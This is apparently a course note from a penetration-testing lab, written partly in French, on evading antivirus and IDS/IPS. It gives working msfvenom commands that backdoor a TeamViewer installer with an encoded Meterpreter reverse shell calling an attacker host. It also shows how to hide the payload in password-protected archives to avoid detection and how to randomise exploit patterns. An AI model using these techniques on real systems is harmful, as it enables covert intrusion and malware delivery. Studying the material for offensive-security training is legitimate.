# Firewall and IDS/IPS Evasion (Revoir)

***

To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:

* Endpoint protection
* Perimeter protection

***

### <mark style="color:red;">Endpoint Protection</mark>

**protection des points de terminaison** (ou _endpoint protection_ en anglais) désigne tout dispositif ou service localisé dont le but principal est de protéger un hôte unique sur un réseau. Cet hôte peut être un ordinateur personnel, une station de travail d'entreprise ou un serveur situé dans la zone démilitarisée (DMZ) d’un réseau.

La protection des points de terminaison prend généralement la forme de **logiciels regroupant plusieurs fonctionnalités**, telles que la **protection antivirus**, la **protection antimalware** (ce qui inclut les _bloatwares_, _spywares_, _adwares_, _scarewares_, _ransomwares_), un **pare-feu (firewall)**, ainsi qu’une **protection contre les attaques DDoS**, le tout réuni dans un seul et même paquet logiciel.

Nous sommes plus familiers avec cette forme de protection, car la plupart d’entre nous utilisons un logiciel de ce type sur nos **ordinateurs personnels à la maison** ou sur les **stations de travail de notre lieu de travail**. Parmi les noms bien connus, on peut citer **Avast, Nod32, Malwarebytes** ou encore **BitDefender**.

***

### <mark style="color:red;">**Perimeter Protection**</mark>

La **protection périmétrique** se trouve généralement sous forme de dispositifs physiques ou virtualisés situés à la périphérie du réseau. Ces dispositifs de bord assurent l'accès de l'extérieur vers l'intérieur du réseau, autrement dit, ils contrôlent le passage de la zone publique à la zone privée.

Entre ces deux zones, on trouve parfois une troisième, appelée la **zone démilitarisée (DMZ)**, mentionnée précédemment. Cette zone applique une politique de sécurité moins stricte que celle du réseau interne, mais bénéficie d’un niveau de confiance supérieur à celui de la zone extérieure, c’est-à-dire l’immense Internet.

C’est dans cet espace virtuel que sont hébergés les serveurs accessibles au public. Ces serveurs échangent des données avec les clients publics via Internet, tout en étant gérés en interne et régulièrement mis à jour avec des correctifs, des informations et d’autres données, afin de maintenir les informations servies à jour et de satisfaire les utilisateurs des serveurs.

***

### <mark style="color:red;">Security Policies</mark>

Les **politiques de sécurité** sont le moteur derrière toute posture de sécurité bien maintenue pour un réseau.

Elles fonctionnent de la même manière que les **ACL (Access Control Lists / Listes de contrôle d'accès)** pour ceux qui sont familiers avec le matériel éducatif **Cisco CCNA**.

Elles sont essentiellement une **liste d'instructions "autoriser" et "refuser"** qui dictent comment le trafic ou les fichiers peuvent exister à l'intérieur d'une limite réseau.

📌 **Plusieurs listes peuvent agir sur plusieurs parties du réseau**, offrant ainsi une flexibilité dans la configuration.\
📌 Ces listes peuvent également cibler **différentes fonctionnalités du réseau et des hôtes**, en fonction de leur emplacement :

* **Politiques de trafic réseau**
* **Politiques d'application**
* **Politiques de contrôle d'accès des utilisateurs**
* **Politiques de gestion des fichiers**
* **Politiques de protection contre les attaques DDoS**
* **Autres**

Bien que toutes ces catégories ne portent pas forcément le terme **"politique de sécurité"**, tous les **mécanismes de sécurité** qui les entourent reposent sur le même **principe de base : les entrées "autoriser" et "refuser"**.

✅ **La seule différence réside dans l'objet cible auquel elles s'appliquent**.

#### **📌 Alors, comment associer les événements du réseau à ces règles pour que les actions soient appliquées ?**

Il existe plusieurs façons d’associer un événement ou un objet à une **entrée de politique de sécurité** :

<table data-header-hidden data-full-width="true"><thead><tr><th width="364"></th><th></th></tr></thead><tbody><tr><td><strong>Security Policy</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Signature-based Detection</code></td><td>The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.</td></tr><tr><td><code>Heuristic / Statistical Anomaly Detection</code></td><td>Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.</td></tr><tr><td><code>Stateful Protocol Analysis Detection</code></td><td>Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.</td></tr><tr><td><code>Live-monitoring and Alerting (SOC-based)</code></td><td>A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead.</td></tr></tbody></table>

***

### <mark style="color:red;">Evasion Techniques</mark>

#### <mark style="color:green;">La détection basée sur les signatures et les techniques de contournement</mark>

La plupart des logiciels antivirus actuels, basés sur l'hôte, reposent principalement sur la **détection par signature** pour identifier les éléments de code malveillant présents dans un logiciel suspect. Ces signatures sont intégrées dans le moteur de l'antivirus, qui les utilise pour analyser l’espace de stockage et les processus en cours afin de détecter toute correspondance. Lorsqu'un logiciel inconnu est détecté et qu’il correspond à une signature, la plupart des antivirus le mettent en quarantaine et terminent le processus en cours.

#### <mark style="color:green;">Contourner la détection des antivirus</mark>

Pour échapper à ces systèmes de détection, il faut souvent se montrer créatif. Simplement encoder les charges utiles avec plusieurs schémas d’encodage en plusieurs passes n’est pas suffisant pour tromper tous les produits antivirus. De plus, établir une communication entre l'attaquant et la victime peut déclencher des alertes avec les systèmes de détection d’intrusion et de prévention d’intrusion (IDS/IPS) actuels.

Cependant, avec la sortie de **MSF6** (la dernière version de Metasploit Framework), `msfconsole` permet de canaliser les communications chiffrées en AES depuis une session Meterpreter jusqu'à l'attaquant, chiffrant ainsi le trafic envoyé à l’hôte victime. Cela rend plus difficile la détection par les IDS/IPS basés sur le réseau. Dans certains cas rares, des règles de trafic strictes peuvent marquer la connexion en fonction de l'adresse IP de l'expéditeur. La seule solution dans ce cas est d'identifier les services autorisés par le réseau cible. Un exemple frappant est l’attaque contre **Equifax en 2017**, où les pirates ont exploité une vulnérabilité dans **Apache Struts** pour accéder aux serveurs de données critiques. Ils ont utilisé des techniques d’exfiltration de données via le DNS pour siphonner lentement les données vers leur domaine, échappant ainsi à la détection pendant des mois.

Pour en savoir plus sur cette attaque :

* Rapport d'enquête du gouvernement américain sur l'attaque d'Equifax
* Protéger contre l'exfiltration de données via DNS
* Stopper l'exfiltration de données et la propagation des logiciels malveillants par le DNS

#### <mark style="color:green;">Utilisation de msfconsole et msfvenom pour contourner la détection</mark>

La fonctionnalité de `msfconsole` pour maintenir des tunnels chiffrés en AES, combinée à l’exécution en mémoire de Meterpreter, renforce considérablement la capacité de contournement des défenses réseau. Toutefois, il reste un défi : une fois que la charge utile (payload) atteint la machine cible, elle peut être analysée pour sa signature, vérifiée dans la base de données, et bloquée, empêchant ainsi l’attaquant d’accéder à la cible.

Les développeurs de logiciels antivirus ajoutent constamment de nouvelles signatures pour bloquer les charges utiles générées par des outils comme `msfconsole`. Cela signifie que la plupart des charges utiles par défaut sont rapidement neutralisées par les antivirus modernes.

#### <mark style="color:green;">Contournement avancé avec les modèles exécutables de msfvenom</mark>

Heureusement, **msfvenom** propose une option permettant d’utiliser des modèles d'exécutables (templates). Cela permet d'injecter des charges utiles dans des fichiers exécutables prédéfinis, comme des programmes d'installation ou des applications, en cachant le code malveillant dans le code légitime du produit réel. Cette technique d’obfuscation réduit les chances de détection, créant ce que l'on appelle un <mark style="color:green;">**exécutable backdooré**</mark><mark style="color:green;">.</mark>

Voici un extrait de code montrant comment msfvenom peut intégrer une charge utile dans n’importe quel fichier exécutable :

{% code title="EVASION" overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
{% endcode %}

```shell-session
mrroboteLiot@htb[/htb]$ ls

Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
```

For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the `-k` flag as it appears above. However, even with the `-k` flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.

***

### <mark style="color:red;">Archives</mark>

Archiver une information, comme un fichier, un dossier, un script, un exécutable, une image ou un document, et y ajouter un mot de passe permet de contourner de nombreuses signatures antivirus courantes aujourd'hui. Cependant, l'inconvénient de cette méthode est que ces fichiers apparaîtront dans le tableau de bord des alertes de l'antivirus avec une notification indiquant qu'ils n'ont pas pu être analysés, car ils sont verrouillés par un mot de passe. Un administrateur peut alors choisir d'inspecter ces archives manuellement pour déterminer si elles sont malveillantes ou non.

<mark style="color:green;">**Generating Payload**</mark>

{% code title="Generating Payload.sh" overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```
{% endcode %}

```shell-session
mrroboteLiot@htb[/htb]$ cat test.js

�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.

<mark style="color:green;">**VirusTotal**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
```

Now, try archiving it two times, passwording both archives upon creation, and removing the `.rar`/`.zip`/`.7z` extension from their names. For this purpose, we can install the [RAR utility](https://www.rarlab.com/download.htm) from RARLabs, which works precisely like WinRAR on Windows.

<mark style="color:green;">**Archiving the Payload**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
mrroboteLiot@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
mrroboteLiot@htb[/htb]$ rar a ~/test.rar -p ~/test.js
```

```shell-session
mrroboteLiot@htb[/htb]$ ls

test.js   test.rar
```

<mark style="color:green;">**Removing the .RAR Extension**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ mv test.rar test
mrroboteLiot@htb[/htb]$ ls

test   test.js
```

<mark style="color:green;">**Archiving the Payload Again**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ rar a test2.rar -p test
```

<mark style="color:green;">**Removing the .RAR Extension**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ mv test2.rar test2
mrroboteLiot@htb[/htb]$ ls

test   test2   test.js
```

The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.

<mark style="color:green;">**VirusTotal**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msf-virustotal -k <API key> -f test2

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 
 
```
{% endcode %}

As we can see from the above, this is an excellent way to transfer data both `to` and `from` the target host.

***

### <mark style="color:red;">Packers</mark>

Le terme **Packer** fait référence au résultat d’un processus de **compression d’exécutable**, où la charge utile (**payload**) est emballée avec un programme exécutable et le code de décompression dans un seul et même fichier. Lors de l’exécution, le code de décompression **rétablit l’exécutable vérolé** dans son état d’origine, ajoutant ainsi une couche supplémentaire de protection contre les mécanismes de **scan de fichiers** sur les machines cibles.

Ce processus est **totalement transparent** : l’exécutable compressé s’exécute exactement comme l’original tout en conservant toutes ses fonctionnalités.

En plus de cela, **msfvenom** offre la possibilité de **compresser**, **modifier la structure du fichier** d’un exécutable infecté et **chiffrer** la structure interne du processus.

🔹 **Liste de logiciels de packers populaires :** (Liste non incluse dans l'extrait, mais il existe des outils comme UPX, Themida, MPRESS, etc.)

|                                     |                                                     |                                                                                         |
| ----------------------------------- | --------------------------------------------------- | --------------------------------------------------------------------------------------- |
| [UPX packer](https://upx.github.io) | [The Enigma Protector](https://enigmaprotector.com) | [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm) |
| Alternate EXE Packer                | ExeStealth                                          | Morphine                                                                                |
| MEW                                 | Themida                                             |                                                                                         |

If we want to learn more about packers, please check out the [PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf).

***

### <mark style="color:red;">Exploit Coding</mark>

Lors de la programmation de notre exploit ou lors du portage d’un exploit préexistant vers le Framework, il est important de s’assurer que le code de l’exploit ne soit pas facilement identifiable par les mesures de sécurité mises en place sur le système cible.

Par exemple, un exploit classique de type **dépassement de tampon (Buffer Overflow)** peut être facilement repéré dans le trafic réseau grâce à ses motifs hexadécimaux caractéristiques. Les dispositifs IDS/IPS (systèmes de détection et de prévention d’intrusion) placés sur le réseau peuvent analyser le trafic vers la machine cible et détecter des motifs spécifiques fréquemment utilisés dans les codes d’exploit.

Lors de l’assemblage de notre code d’exploit, la **randomisation** peut permettre d’introduire de la variation dans ces motifs, ce qui aura pour effet de contourner les signatures présentes dans les bases de données des IPS/IDS pour les tampons d’exploits connus. Cela peut se faire en ajoutant un paramètre Offset dans le code du module msfconsole, par exemple :

```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

En plus du code BoF, il faut toujours éviter d’utiliser des **NOP sleds** trop évidents à l’endroit où le shellcode doit atterrir après le dépassement de tampon. Il est important de noter que le but du code BoF est de faire planter le service en cours d’exécution sur la machine cible, tandis que le NOP sled correspond à la zone mémoire allouée où notre shellcode (la charge utile) sera inséré.

Les dispositifs IPS/IDS surveillent régulièrement ces deux éléments, il est donc conseillé de tester notre code d’exploit personnalisé dans un environnement sandbox avant de le déployer sur le réseau du client. Bien sûr, lors d’une évaluation, il se peut que nous n’ayons qu’une seule chance de le faire correctement.

***
